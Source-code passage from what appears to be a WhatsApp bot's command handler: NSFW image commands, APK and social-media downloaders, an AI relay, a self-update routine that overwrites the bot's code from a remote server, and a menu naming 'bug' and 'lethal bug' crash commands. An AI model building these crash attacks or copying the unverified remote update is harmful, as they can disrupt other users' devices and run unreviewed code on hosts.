var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'milf':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfw':{
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
               if (args.length < 1) return setReply('*Enable or disable? Use: ᴏɴ/ᴏꜰꜰ*')
               if (args[0] === 'on') {
                  db.data.chats[from].nsfw = true
                  setReply(`*\`${command} has been enabled in this group\`*`)
       let warning = Ehztext(` 
  *「 ⚠️ 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 ⚠️ 」*\n\`\`\`The NSFW (Not Safe For Work) feature has been activated in this group. As a result, explicit content may be accessible through the bot. Please proceed with caution and ensure compliance with community guidelines.\`\`\`
`)
    m.reply(warning)
               } else if (args[0] === 'off') {
                  db.data.chats[from].nsfw = false
 setReply(`*\`${command} has been disabled in this group\`*`)
               }
               }
            break
case 'aza': 
case 'pay': 
case 'acc': {
    setReply(
        `💳 *Banking Details* 💳\n\n🏦 *Bank Name:* *${bank}*\n🔢 *Acc Number:* *${accnumber}*\n👤 *Acc Name:* *${bankname}*`
    );
    break;
}
case 'blueai': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
    const prompt = "You are BLUE AI, an advanced artificial intelligence model developed by BLUE DEMON for the BLUEXDEMON-V4 project. As BLUE AI Version 4, you are designed to provide insightful and accurate responses. Your purpose is to assist users with a wide range of tasks and queries effectively,from now on u are Branded by this. Question: ";
        // Construct API URL
        const apiUrl = `https://api-lenwy.vercel.app/ai4chat?text=${encodeURIComponent(prompt)}${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (res.status !== 200 || !res.data) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.data;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './database/blueimages/thumb.jpeg', // Path to ChatGPT image
            },
            caption: `*BLUE AI Response:*\n\n\`\`\`${aiResponse}\`\`\`\n> ${caption}`,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in BLUE Ai case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }

    break;
}
case 'quote': {
    try {
        await loading();

        // Fetch a quote from the API
        let res = await fetch(`https://www.bhandarimilan.info.np/quote`);
        let json = await res.json();

        // Check if the response is valid
        if (json.code !== 200 || !json.quote) {
            return reply("Failed to fetch a quote. Please try again later.");
        }

        // Send the quote
        await reply(`📝 *Quote:* \n\n\`\`\`${json.quote}\`\`\`\n - ${json.character} from ${json.anime}\n> ${caption}`);
    } catch (error) {
        console.error("Error in quote case:", error);
        reply("An error occurred while fetching a quote. Please try again later.");
    }
    break;
}
case 'all-in-one': case 'facebook2': case 'tiktok2': case 'Instagram2': case 'ig': case 'instagram': {
    if (!q) {
        return reply(`*\`Please provide a URL.\`*\n*Example: ${prefix + command} link*`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/download/alldownload?url=${encodeURIComponent(q)}`;

        // Fetch data from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract high-quality video URL
        const { title, high } = res.BK9;

        // Send the high-quality video
        await conn.sendMessage(from, {
            video: { url: high },
            caption: `🎥 *${title}*\n\n> ${caption}`,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in all-in-one case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'apkfab': {
    if (!q) {
        return reply(`*\`Please provide an APK URL.\`*\n*Example: ${prefix + command} apkfab-link*`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/download/apkfab?url=${encodeURIComponent(q)}`;

        // Fetch APK details from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch APK details. Please try again later.");
        }

        // Extract APK details
        const { title, link, size } = res.BK9;

        // Send APK details
        await conn.sendMessage(m.chat, {
            text: `🖥️ *APK Details:*\n\n📌 *Title: ${title}*\n📦 *Size:* ${size || 'Unknown'}\n\`\`\`May take few minutes🔃\`\`\`\n> ${caption}`,
        }, { quoted: m });

        // Send APK file after initial message
        await conn.sendMessage(m.chat, {
            document: { url: link },
            mimetype: "application/octet-stream",
            fileName: `${title}.apk`,
            caption: `📥 *APK Download: ${title}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error in APKFab case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'apk': case 'app': {
    if (!q) {
        return reply(`*\`No apk name detected.\`*\n*Example: ${prefix + command} Facebook*`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/download/apk?id=${encodeURIComponent(q)}`;

        // Fetch APK details from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch APK details. Please try again later.");
        }

        // Extract APK details
        const { name, lastup, icon, dllink } = res.BK9;

        // Send APK icon and details
        await conn.sendMessage(m.chat, {
            image: { url: icon },  // Send the APK icon
            caption: `📱 *APK Details:*\n\n📌 *Name:* ${name}\n📅 *Last Updated:* ${lastup}\n🆔 *Package:* com.${q}\n\n> ${caption}`,
        }, { quoted: m });

        // Send APK file as a download
        await conn.sendMessage(m.chat, {
            document: { url: dllink },
            mimetype: "application/octet-stream",
            fileName: `${name}.apk`,
            caption: `📥 *APK Download: ${name}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error in APK case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'twitter': {
    if (!q) {
        return reply(`*No Twitter URL detected.*\n\n*Example: ${prefix + command} link*`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/download/twitter?url=${encodeURIComponent(q)}`;

        // Fetch Twitter details from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch Twitter video. Please try again later.");
        }

        // Extract Twitter video details
        const { HD, username, thumbnail } = res.BK9;

        // Send the Twitter video with details
        await conn.sendMessage(m.chat, {
            video: { url: HD },  // Send the HD video URL
            caption: `🐦 *Twitter Video Details:*\n\n👤 *Username:* ${username}\n\n> ${caption}`,
            thumbnail: { url: thumbnail }, // Set the video thumbnail
        }, { quoted: m });

    } catch (error) {
        console.error("Error in Twitter case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'tts': case 'say': {
    if (!q) {
        return reply(`\`Please provide text to convert to speech.\`\n\n*Example:*\n${prefix + command} hello`);
    }

    try {
        await loading();

        // Construct the API URL with the query and language
        const apiUrl = `https://bk9.fun/tools/tts?q=${encodeURIComponent(q)}&lang=en`;
        const response = await fetch(apiUrl);

        // Validate the API response
        if (!response.ok) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Prepare the TTS audio file
        await conn.sendMessage(from, {
            audio: { url: apiUrl }, // Directly use the API URL as the audio source
            mimetype: "audio/mp4",
            fileName: `tts_${Date.now()}.mp3`,
            ptt: true, // Send as a voice note
        }, { quoted: m });

    } catch (error) {
        console.error("Error in TTS case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
global.badword = false
   case 'antibadword': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.badword = true; // Enable auto react
                        await setReply('`Successfully Activated antibadword.`');
                    } else if (args[0] === 'off') {
                        global.badword = false; // Disable auto react
                        await setReply('`Successfully Deactivated antibadword.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle antibadword.\``);
                    }
                    break;
                }
case 'shortlink': {
    if (!q || !q.includes("|")) {
        return setReply("Please provide a URL and an alias in the format: `.shortlink <link> | <alias>`");
    }

    const [url, alias] = q.split("|").map(item => item.trim()); // Split and trim inputs

    if (!url.startsWith("http://") && !url.startsWith("https://")) {
        return setReply("Invalid URL format. Please provide a valid URL starting with http:// or https://.");
    }

    if (!alias) {
        return setReply("Please provide a valid alias.");
    }

    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://bk9.fun/tools/shortlink?url=${encodeURIComponent(url)}&alias=${encodeURIComponent(alias)}`;

        // Fetch the shortlink
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate the API response
        if (!res.status || !res.BK9) {
            return setReply("Failed to shorten the URL. Please try again later.");
        }

        // Send the shortened link
        setReply(`*Shortened Link:*\n${res.BK9}`);
    } catch (error) {
        console.error("Error in shortlink case:", error);
        setReply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'imenu': {
    try {
        // Define the image path
        const imagePath = './database/blueimages/thumb.jpeg';

        // Define the caption
        const captionx = Ehztext(`
       *『 \`𝘽𝙇𝙐𝙀 𝙓 𝘿𝙀𝙈𝙊𝙉\` 』*
> ■ 𝙽𝙰𝙼𝙴  :  ${pushname}
> ■ 𝚂𝚃𝙰𝚃𝚄𝚂 :  ${isPremium ? '𝙿𝚛𝚎𝚖𝚒𝚞𝚖' : '𝙵𝚛𝚎𝚎'}
> ■ 𝙼𝙾𝙳𝙴 : ${publik ? '𝙿𝚞𝚋𝚕𝚒𝚌' : '𝚂𝚎𝚕𝚏'}
> ■ 𝙿𝚁𝙴𝙵𝙸𝚇 : ${prefix}
> ■ 𝚁𝚄𝙽 𝙸𝙽 : ${runWith} 
> ■ 𝙳𝙰𝚃𝙴 :  *${calender}*
> ■ 𝚃𝙸𝙼𝙴 :  *${timeWib}*
 ${readmore}
┏─『 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
┇*${sign} addowner*
┇*${sign} delowner*
┇*${sign} listowner*
┇*${sign} self*
┇*${sign} public*
┇*${sign} mode*
┇*${sign} delete*
┇*${sign} read*
┇*${sign} setpp*
┇*${sign} block*
┇*${sign} unblock* 
┇*${sign} setbio*
┇*${sign} update*
┇*${sign} restart*
┇*${sign} owner*
┇*${sign} clearchat*
┇*${sign} setbotname*
┗─────────────❐

┏─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
┇*${sign} tagall*
┇*${sign} kick*
┇*${sign} add*
┇*${sign} mute*
┇*${sign} tag*
┇*${sign} tagme*
┇*${sign} kickall*
┇*${sign} invite*
┇*${sign} gcinfo*
┇*${sign} setppgc*
┇*${sign} setdesc*
┇*${sign} getppgc*
┇*${sign} delppgc*
┇*${sign} inspect*
┇*${sign} revoke*
┇*${sign} antilink*
┇*${sign} antivirtex*
┇*${sign} antidelete*
┇*${sign} antibot*
┇*${sign} unmute*
┇*${sign} revoke*
┇*${sign} promote*
┇*${sign} demote*
┇*${sign} gclink*
┇*${sign} leavegc*
┇*${sign} listonline*
┇*${sign} opentime*
┇*${sign} closetime*
┇*${sign} welcome*
┇*${sign} tagadmin*
┇*${sign} listadmin*
┇*${sign} setgcname*
┇*${sign} resetgclink*
┇*${sign} antibadword*
┗─────────────❐

┏─『 \`𝐌𝐄𝐃𝐈𝐀 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒\` 』
┇*${sign} play*
┇*${sign} song*
┇*${sign} yts <link>*
┇*${sign} ytmp3 <link>*
┇*${sign} ytmp4 <link>*
┇*${sign} all-in-one <link>*
┇*${sign} tiktok <link>*
┇*${sign} tiktok2 <link>*
┇*${sign} twitter <link>*
┇*${sign} facebook <link>*
┇*${sign} facebook2 <link>*
┇*${sign} instagram <link>*
┇*${sign} instagram2 <link>*
┗─────────────❐

┏─『 \`𝐅𝐈𝐋𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐒\` 』
┇*${sign} apk <name>*
┇*${sign} app <name>*
┇*${sign} apkfab <link>*
┇*${sign} gitclone <link>*
┇*${sign} mediafire <link>*
┇*${sign} githubdl <link>*
┗─────────────❐

┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
┇*${sign} vv*
┇*${sign} vv2*
┇*${sign} runtime*
┇*${sign} ping*
┇*${sign} areact*
┇*${sign} join*
┇*${sign} script*
┇*${sign} sticker*
┇*${sign} take*
┇*${sign} getjid*
┇*${sign} fancy*
┇*${sign} style*
┗─────────────❐

┏─『 \`𝐒𝐄𝐀𝐑𝐂𝐇 𝐌𝐄𝐍𝐔\` 』
┇*${sign} lyrics*
┇*${sign} google*
┇*${sign} playstore*
┇*${sign} happymod*
┇*${sign} pinterest*
┇*${sign} element*
┇*${sign} blackpink*
┗─────────────❐

┏─『 \`𝐀𝐈 𝐌𝐄𝐍𝐔\` 』
┇*${sign} blueai*
┇*${sign} gemini*
┇*${sign} gemini2*
┇*${sign} gemini-pro*
┇*${sign} chatgpt*
┇*${sign} blackbox*
┗─────────────❐

┏─『 \`𝐒𝐓𝐀𝐋𝐊𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
┇*${sign} gitstalk*
┇*${sign} wachannel*
┇*${sign} tiktokstalk*
┇*${sign} freefirestalk*
┇*${sign} npmcheck*
┗─────────────❐

┏─『 \`𝐀𝐃𝐕𝐀𝐍𝐂𝐄 𝐓𝐎𝐎𝐋𝐒\` 』
┇*${sign} tts*
┇*${sign} shortlink*
┇*${sign} tinyurl*
┇*${sign} ssweb*
┗─────────────❐

┏─『 \`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` 』
┇*${sign} flirt*    
┇*${sign} truth*
┇*${sign} jokes*
┇*${sign} love*
┇*${sign} conf*
┇*${sign} angry*
┇*${sign} rizz*
┗─────────────❐

┏─『 \`𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
┇*${sign} anticall*
┇*${sign} alwaysonline*
┇*${sign} autotyping*
┇*${sign} autoreadchat*
┇*${sign} autoviewstatus*
┇*${sign} listcase*
┇*${sign} alive*
┇*${sign} scan*
┇*${sign} translate*
┇*${sign} encode*
┇*${sign} decode*
┇*${sign} encrypt*
┇*${sign} svcontact*
┇*${sign} obfuscate*
┇*${sign} checkip*
┇*${sign} broadcast*
┇*${sign} exchange*
┇*${sign} randomcolor*
┇*${sign} getsession*
┇*${sign} checkcolor*
┗─────────────❐

┏─『 \`𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔\` 』
┇*${sign} nsfw*
┇*${sign} waifu*
┇*${sign} neko*
┇*${sign} trap*
┇*${sign} blowjob*
┇*${sign} cuckold*
┇*${sign} eba*
┇*${sign} pussy*
┇*${sign} yuri*
┇*${sign} zattai*
┇*${sign} foot*
┇*${sign} milf*
┗─────────────❐

┏─『 \`𝐁𝐔𝐆 𝐌𝐄𝐍𝐔\` 』
┇*${sign} bluex*
┇*${sign} xbug*
┇*${sign} bugui*
┇*${sign} hunt*
┗─────────────❐

┏─『 \`𝐋𝐄𝐓𝐇𝐀𝐋 𝐁𝐔𝐆𝐒\` 』
┇*${sign} gang-bang*  
┇*${sign} kill*
┇*${sign} astro-lock*
┇*${sign} blast*
┗─────────────❐

┏─『 \`𝐄𝐏𝐇𝐎𝐓𝐎 𝐌𝐄𝐍𝐔\` 』
┇*${sign} writetext*  
┇*${sign} glitchtext*  
┇*${sign} pixelglitch*  
┇*${sign} neonglitch*  
┇*${sign} royaltext*  
┇*${sign} flagtext*  
┇*${sign} flag3dtext*  
┇*${sign} glowingtext*  
┇*${sign} logomaker*  
┇*${sign} gradienttext*   
┇*${sign} luxurygold*  
┇*${sign} 1917style*  
┇*${sign} freecreate*  
┇*${sign} galaxystyle*  
┇*${sign} lighteffects* 
┇*${sign} makingneon*  
┇*${sign} cartoonstyle*  
┇*${sign} deletingtext*  
┇*${sign} blackpinkstyle* 
┇*${sign} papercutstyle*  
┇*${sign} sandsummer*  
┇*${sign} effectclouds*  
┇*${sign} blackpinklogo*  
┇*${sign} summerbeach*  
┇*${sign} advancedglow*  
┇*${sign} watercolortext*  
┇*${sign} underwatertext*  
┇*${sign} typographytext*  
┇*${sign} galaxywallpaper*  
┇*${sign} multicoloredneon*  
┗─────────────❐
> ${caption}`);

        // Send the image with the caption
        await conn.sendMessage(from, {
            image: { url: imagePath },
            caption: captionx,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in imenu case:", error);
        setReply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'brave': {
    if (!q) return setReply("Please provide a search query.");
    
    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://api.siputzx.my.id/api/s/brave?query=${encodeURIComponent(q)}`;

        // Fetch the search results
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate the API response
        if (!res.status || !res.data || !res.data.results) {
            return setReply("No results found for your query. Please try again later.");
        }

        const { results } = res.data;
        const maxResults = 5; // Limit the number of results sent

        // Prepare the formatted message
        let message = `🔍 *Brave Search Results for:* "${q}"\n\n`;
        results.slice(0, maxResults).forEach((item, index) => {
            message += `*${index + 1}. ${item.title}*\n_${item.siteName}_ | ${item.date || "Unknown"}\n${item.description}\n\n`;
        });

        message += `> ${caption}\n`;

        // Send the image with the caption
        await conn.sendMessage(m.chat, {
            image: {
                url: './database/blueimages/brave.jpg', // Local image path
            },
            caption: message,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in brave case:", error);
        setReply("An error occurred while fetching the search results. Please try again later.");
    }
    break;
}
case 'bing': {
    if (!q) return setReply("Please provide a search query.");

    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://api.siputzx.my.id/api/s/bimg?query=${encodeURIComponent(q)}`;

        // Fetch the image search results
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate the API response
        if (!res.status || !res.data || res.data.length === 0) {
            return setReply("No images found for your query. Please try again later.");
        }

        // Send the first image with a caption
        const imageUrl = res.data[0];
        await conn.sendMessage(from, {
            image: { url: imageUrl },
            caption: `🔎 *Bing Image Search Results for:* "${q}"\n\n> Powered by Bing`,
        });

    } catch (error) {
        console.error("Error in bing case:", error);
        setReply("An error occurred while fetching the images. Please try again later.");
    }
    break;
}
case 'cecan-indo': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/indonesia`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return setReply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `🌸 Here's a random Indonesian Cecan image for you!\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecan case:", error);
        setReply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-china': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/china`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return setReply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `🌸 Here's a random Chinese Cecan image for you!\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecanchina case:", error);
        setReply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-japan': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/japan`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return setReply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `🎌 Here's a random Japanese Cecan image for you!\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecanjapan case:", error);
        setReply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-korea': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/korea`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return setReply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `🇰🇷 Here's a random Korean Cecan image for you!\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecankorea case:", error);
        setReply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-thai': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/thailand`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return setReply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `🇹🇭 Here's a random Thai Cecan image for you!\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecanThailand case:", error);
        setReply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-mal': {
    try {
        await loading();

        const apiUrl = 'https://api.agatz.xyz/api/malaysia';
        const response = await fetch(apiUrl);
        const res = await response.json();

        if (res.status !== 200 || !res.data?.url) {
            return setReply("Failed to fetch the Cecan image. Please try again later.");
        }

        await conn.sendMessage(from, {
            image: { url: res.data.url },
            caption: `*Here is a Cecan from Malaysia 🇲🇾*\n> ${caption}`,
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Cecan Malaysia case:", error);
        setReply("An error occurred while fetching the Cecan image. Please try again later.");
    }
    break;
}
case 'update': {
    if (!isOwner) return reply(mess.only.owner);
    await loading();

    const filesToUpdate = [
        {
            url: 'https://huggingface.co/spaces/BACKUPSERVER/UPDATE/raw/main/case.js',
            path: './message/case.js',
            name: 'case.js'
        },
        {
            url: 'https://huggingface.co/spaces/BACKUPSERVER/UPDATE/raw/main/help.js',
            path: './message/help.js',
            name: 'help.js'
        },
        {
            url: 'https://huggingface.co/spaces/BACKUPSERVER/UPDATE/raw/main/settings.js',
            path: './settings.js',
            name: 'settings.js'
        },
        {
            url: 'https://huggingface.co/spaces/BACKUPSERVER/UPDATE/raw/main/message.js',
            path: './message/message.js',
            name: 'message.js'
        }
    ];

    reply("*𝐔𝐏𝐃𝐀𝐓𝐈𝐍𝐆*");

    try {
        const fs = require('fs');
        for (const file of filesToUpdate) {
            const response = await fetch(file.url);
            if (!response.ok) {
                reply(`Failed to update *${file.name}*. Server responded with ${response.status}.`);
                continue;
            }

            const newContent = await response.text();
            fs.writeFileSync(file.path, newContent, 'utf8');
            reply(`*${file.name}* successfully updated.`);
        }
        await sleep(700);
        reply('𝐀𝐋𝐋 𝐅𝐈𝐋𝐄𝐒 𝐔𝐏𝐃𝐀𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘.');
    } catch (error) {
        console.error("Error during update:", error);
        reply("Failed to update files. Please check the console for errors.");
    }
    break;
}
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95': {
    try {
        await loading();
        
        const url = `https://github.com/anonphoenix007/phonk-api/raw/main/all/${command}.mp3`;
        const reslt = await getBuffer(url);
        
        // Send the audio as a voice note
        await conn.sendMessage(m.chat, { 
            audio: reslt, 
            mimetype: 'audio/mp4', 
            ptt: true 
        }, { quoted: m });
        
        // Send the caption after the audio
        await conn.sendMessage(m.chat, { 
            text: `> ${caption}` 
        }, { quoted: m });
    } catch (error) {
        console.error(`Error in ${command} case:`, error);
        setReply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'rps': {
    if (!q) return setReply(`Please choose one: rock, paper, or scissors.\nExample: ${prefix}rps rock`);
    
    const userChoice = q.toLowerCase();
    const validChoices = ['rock', 'paper', 'scissors'];
    if (!validChoices.includes(userChoice)) {
        return setReply("Invalid choice. Please choose 'rock', 'paper', or 'scissors'.");
    }

    // Bot's random choice
    const botChoice = validChoices[Math.floor(Math.random() * validChoices.length)];

    // Determine the winner
    let result, imageUrl;
    if (userChoice === botChoice) {
        result = "It's a draw!";
    } else if (
        (userChoice === 'rock' && botChoice === 'scissors') ||
        (userChoice === 'paper' && botChoice === 'rock') ||
        (userChoice === 'scissors' && botChoice === 'paper')
    ) {
        result = "```You win! ```🎉";
    } else {
        result = "```You lose! 😢```";
    }

    // Assign the image based on the choices
    if (userChoice === 'rock' && botChoice === 'paper') {
        imageUrl = 'https://huggingface.co/spaces/BLUESERVER/DATABASE/resolve/main/rockandpaper.jpg';
    } else if (userChoice === 'paper' && botChoice === 'scissors') {
        imageUrl = 'https://huggingface.co/spaces/BLUESERVER/DATABASE/resolve/main/paperandscissor.jpg';
    } else if (userChoice === 'rock' && botChoice === 'scissors') {
        imageUrl = 'https://huggingface.co/spaces/BLUESERVER/DATABASE/resolve/main/rockandscissors.jpg';
    }

    // Send the result
    await conn.sendMessage(from, {
        image: { url: imageUrl || '' },
        caption: `🤖 *Rock, Paper, Scissors*\n\nYou chose: \`\`\`${userChoice}\`\`\`\nI chose: \`\`\`${botChoice}\`\`\`\n\n*Result:* ${result}`,
    }, { quoted: m });

    break;
}
case 'get': {
    if (!q) return setReply("Please provide a valid link to fetch.");

    // Check if the input is a valid URL
    const isValidUrl = (url) => {
        try {
            new URL(url);
            return true;
        } catch (err) {
            return false;
        }
    };

    if (!isValidUrl(q)) return setReply("Invalid URL. Please provide a proper link.");

    try {
        await loading();

        // Fetch the HTML content of the provided link
        const response = await fetch(q);
        if (!response.ok) {
            return setReply(`Failed to fetch the link. Server responded with status: ${response.status}`);
        }

        const html = await response.text();

        // Truncate the output if it's too long
        const maxLength = 70000; // WhatsApp message limit
        const output = html.length > maxLength 
            ? html.slice(0, maxLength) + `\n\n*Output truncated. Full content exceeds ${maxLength} characters.*` 
            : html;

        setReply(`*HTML Content of the Link:*\n\n${output}`);
    } catch (error) {
        console.error("Error in get case:", error);
        setReply("An error occurred while fetching the link. Please try again later.");
    }
    break;
}
case 'ban': case 'suspend': {
    if (!isGroup) return setReply(mess.only.group)
    if (!isOwner && !isAdmins) return setReply(mess.only.admin);
    if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
    await loading();
    // Get the target user (via reply or tag)
    let target = mentionByReply ? quoted.sender : mentionByTag[0];
    if (!target) return reply('`No target detected`\n*Reply or tag the person*');

    // Store the banned user and group information
    const banData = JSON.parse(fs.readFileSync('./database/banned.json', 'utf-8') || '[]');
    const entry = {
        number: target,
        groupJid: isGroup ? m.chat : null
    };

    if (banData.some(ban => ban.number === entry.number && ban.groupJid === entry.groupJid)) {
        return reply('𝚃𝚑𝚒𝚜 𝚞𝚜𝚎𝚛 𝚒𝚜 𝚊𝚕𝚛𝚎𝚊𝚍𝚢 𝚋𝚊𝚗𝚗𝚎𝚍.');
    }

    banData.push(entry);
    fs.writeFileSync('./database/banned.json', JSON.stringify(banData, null, 2));
